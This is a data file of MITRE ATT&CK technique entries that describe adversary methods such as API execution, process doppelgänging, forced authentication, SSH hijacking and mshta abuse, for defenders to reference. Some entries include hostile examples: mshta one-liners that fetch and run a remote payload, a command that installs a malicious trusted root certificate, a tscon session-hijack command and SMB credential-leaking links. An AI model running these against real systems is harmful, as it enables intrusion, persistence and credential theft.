T1106	Execution through API	Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters.\n\nAdditional Windows API calls that can be used to execute binaries include:\n\n*CreateProcessA() and CreateProcessW(),\n*CreateProcessAsUserA() and CreateProcessAsUserW(),\n*CreateProcessInternalA() and CreateProcessInternalW(),\n*CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n*LoadLibraryA() and LoadLibraryW(),\n*LoadLibraryExA() and LoadLibraryExW(),\n*LoadModule(),\n*LoadPackagedLibrary(),\n*WinExec(),\n*ShellExecuteA() and ShellExecuteW(),\n*ShellExecuteExA() and ShellExecuteExW()	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1106
T1107	File Deletion	Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [[Software/S0106|cmd]] functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1107
T1104	Multi-Stage Channels	Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [[Technique/T1008|Fallback Channels]] in case the original first-stage communication path is discovered and blocked.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1104
T1105	Remote File Copy	Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the [[Command and Control]] channel to bring tools into the victim network or through alternate protocols with another tool such as [[Software/S0095|FTP]]. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support [[Lateral Movement]] with remote [[Execution]] using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [[Technique/T1077|Windows Admin Shares]] or [[Technique/T1076|Remote Desktop Protocol]].	Command and Control, Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1105
T1108	Redundant Access	Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [[Technique/T1078|Valid Accounts]] to use [[Technique/T1133|External Remote Services]] such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.\n\nUse of a [[Technique/T1100|Web Shell]] is one such way to maintain access to a network through an externally accessible Web server.	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1108
T1109	Component Firmware	Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [[Technique/T1019|System Firmware]] but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1109
T1061	Graphical User Interface	Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as [[Technique/T1076|Remote Desktop Protocol]].	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1061
T1069	Permission Groups Discovery	Adversaries may attempt to find local system or domain-level groups and permissions settings. \n\nWindows\n\nExamples of commands that can list groups are net group /domain and net localgroup using the [[Software/S0039|Net]] utility.\n\nMac\n\nOn Mac, this same thing can be accomplished with the dscacheutil -q group for the domain, or dscl . -list /Groups for local groups.\n\nLinux\n\nOn Linux, local groups can be enumerated with the groups command and domain groups via the ldapsearch command.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1069
T1188	Multi-hop Proxy	To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy.  This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1188
T1189	Drive-by Compromise	A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. This can happen in several ways, but there are a few main components: \n\nMultiple ways of delivering exploit code to a browser exist, including:\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n# A user visits a website that is used to host the adversary controlled content.\n# Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n#* The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n# Upon finding a vulnerable version, exploit code is delivered to the browser.\n# If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n#* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [[Technique/T1190|Exploit Public-Facing Application]], the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1189
T1065	Uncommonly Used Port	Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1065
T1064	Scripting	Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [[Technique/T1193|Spearphishing Attachment]] and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [[Technique/T1203|Exploitation for Client Execution]], where adversaries will rely on macos being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit, Veil, and PowerSploit are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1064
T1067	Bootkit	A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nMaster Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.\n\nVolume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1067
T1183	Image File Execution Options Injection	Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, any executable file present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., \u201cC:\dbg\ntsd.exe -g  notepad.exe\u201d).\n\nIFEOs can be set directly via the Registry or in Global Flags via the Gflags tool. IFEOs are represented as Debugger Values in the Registry under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable> and  HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>  where <executable> is the binary on which the debugger is attached.\n\nSimilar to Process Injection, this value can be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. Installing IFEO mechanisms may also provide [[Persistence]] via continuous invocation.\n\nMalware may also use IFEO for [[Defense Evasion]] by registering invalid debuggers that redirect and effectively disable various system and security applications.	Defense Evasion, Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1183
T1182	AppCert DLLs	Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager are loaded into every process that calls the ubiquitously used application programming interface (API) functions:\n*CreateProcess\n*CreateProcessAsUser\n*CreateProcessWithLoginW\n*CreateProcessWithTokenW\n*WinExec\nSimilar to [[Technique/T1055|Process Injection]], this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1182
T1068	Exploitation for Privilege Escalation	Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform [[Privilege Escalation]] to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.	Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1068
T1180	Screensaver	Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.exe is located in C:\Windows\System32\ along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:\n\n*SCRNSAVE.exe - set to malicious PE path\n*ScreenSaveActive - set to '1' to enable the screensaver\n*ScreenSaverIsSecure - set to '0' to not require a password to unlock\n*ScreenSaverTimeout - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1180
T1181	Extra Window Memory Injection	Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may take place in the address space of a separate live process. Similar to [[Technique/T1055|Process Injection]], this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.	Defense Evasion, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1181
T1186	Process Doppelgänging	Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.\n\nAdversaries may leverage TxF to a perform a file-less variation of [[Technique/T1055|Process Injection]] called Process Doppelg\xe4nging. Similar to [[Technique/T1093|Process Hollowing]], Process Doppelg\xe4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelg\xe4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.\n\nProcess Doppelg\xe4nging is implemented in 4 steps:\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1186
T1187	Forced Authentication	The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary, or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. With access to the credential hash, an adversary can perform off-line [[Technique/T1110|Brute Force]] cracking to gain access to plaintext credentials, or reuse it for [[Technique/T1075|Pass the Hash]].\n\nThere are several different ways this can occur. Some specifics from in-the-wild use include:\n*A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened. The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request.\n*A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1187
T1184	SSH Hijacking	Secure Shell (SSH) is a standard means of remote access on Linux and Mac systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. Compromising the SSH agent also provides access to intercept SSH credentials.\n\n[[Technique/T1184|SSH Hijacking]] differs from use of [[Technique/T1021|Remote Services]] because it injects into an existing SSH session rather than creating a new session using [[Technique/T1078|Valid Accounts]].	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1184
T1185	Man in the Browser	Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques.\n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet.\n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1185
T1041	Exfiltration Over Command and Control Channel	Data exfiltration is performed over the [[Command and Control]] channel.  Data is encoded into the normal communications channel using the same protocol as command and control communications.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1041
T1078	Valid Accounts	Adversaries may steal the credentials of a specific user or service account using [[Credential Access]] techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining [[Initial Access]]. \n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nAdversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. \n\nThe overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.	Defense Evasion, Persistence, Privilege Escalation, Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1078
T1079	Multilayer Encryption	An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1079
T1076	Remote Desktop Protocol	Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access [[Technique/T1021|Remote Services]] similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use [[Credential Access]] techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [[Technique/T1015|Accessibility Features]] technique for [[Persistence]].\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, c:\windows\system32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to [[Technique/T1018|Remote System Discovery]] and [[Privilege Escalation]] by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1076
T1077	Windows Admin Shares	Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. \n\nAdversaries may use this technique in conjunction with administrator-level [[Technique/T1078|Valid Accounts]] to remotely access a networked system over server message block (SMB) to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote [[Execution]]. Example execution techniques that rely on authenticated sessions over SMB/RPC are [[Technique/T1053|Scheduled Task]], [[Technique/T1035|Service Execution]], and [[Technique/T1047|Windows Management Instrumentation]]. Adversaries can also use NTLM hashes to access administrator shares on systems with [[Technique/T1075|Pass the Hash]] and certain configuration and patch levels.\n\nThe [[Software/S0039|Net]] utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1077
T1074	Data Staged	Collected data is staged in a central location or directory prior to [[Exfiltration]]. Data may be kept in separate files or combined into one file through techniques such as [[Technique/T1002|Data Compressed]] or [[Technique/T1022|Data Encrypted]].\n\nInteractive command shells may be used, and common functionality within [[Software/S0106|cmd]] and bash may be used to copy data into a staging location.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1074
T1075	Pass the Hash	Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a [[Credential Access]] technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \n\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1075
T1072	Third-party Software	Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.\n\nAdversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.	Execution, Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1072
T1073	DLL Side-Loading	Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL.\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1073
T1070	Indicator Removal on Host	Adversaries may delete or alter generated event files on a host system, including potentially captured files such as quarantined malware. This may compromise the integrity of the security solution, causing events to go unreported, or make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1070
T1071	Standard Application Layer Protocol	Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1071
T1177	LSASS Driver	The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.\n\nAdversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [[Technique/T1073|DLL Side-Loading]] or [[Technique/T1038|DLL Search Order Hijacking]]), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.	Execution, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1177
T1176	Browser Extensions	Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser, to include credentials, and be used as an installer for a RAT for [[persistence]]. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. There have also been similar examples of extensions being used for command & control .	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1176
T1175	Distributed Component Object Model	Windows Distributed Component Object Model (DCOM) is transparent middleware that extends the functionality of Component Object Model (COM) beyond a local computer using remote procedure call (RPC) technology. COM is a component of the Windows application programming interface (API) that enables interaction between software objects. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke [[Technique/T1173|Dynamic Data Exchange]] (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1175
T1174	Password Filter DLL	Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.\n\nBefore registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1174
T1173	Dynamic Data Exchange	Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nAdversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1173
T1172	Domain Fronting	Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1172
T1130	Install Root Certificate	Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications.\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of [[Persistence]].\n\nIn macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1130
T1170	Mshta	Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code \n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer\'s security context, it also bypasses browser security settings.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1170
T1179	Hooking	Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:\n* Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* Import address table (IAT) hooking, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\n* Inline hooking, which overwrites the first bytes in an API function to redirect code flow.\n\nSimilar to [[Technique/T1055|Process Injection]], adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide [[Persistence]] via continuous invocation when the functions are called through normal use.\n\nMalicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for [[Credential Access]].\n\nHooking is commonly utilized by [[Technique/T1014|Rootkit]]s to conceal files,\nprocesses, Registry keys, and other objects in order to hide malware and associated behaviors.	Credential Access, Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1179
